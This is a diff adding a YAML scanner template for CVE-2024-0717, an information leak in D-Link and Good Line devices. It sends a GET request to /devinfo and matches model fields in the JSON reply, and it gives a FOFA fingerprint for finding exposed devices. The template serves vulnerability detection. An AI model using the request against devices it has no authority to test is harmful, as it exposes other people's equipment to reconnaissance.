@@ -1,0 +1,16 @@
+id: poc-yaml-d-link-and-good-line-devinfo-information-leak
+info:
+  name: D-Link and Good Line devinfo 信息泄露漏洞(CVE-2024-0717)
+  severity: medium
+  tags:
+  - CVE-2024-0717
+  - 信息泄露
+  finger: d-link
+  fofa: admin/templates/body.tpl.html
+requests:
+- method: GET
+  path: /devinfo?area=notice|net|version
+  expression: status_code == 200 && contains(body,"\"modelName\"") && contains(body,"\"modelId\"")
+    && contains(headers,"application/json")
+variables: {}
+transport: http
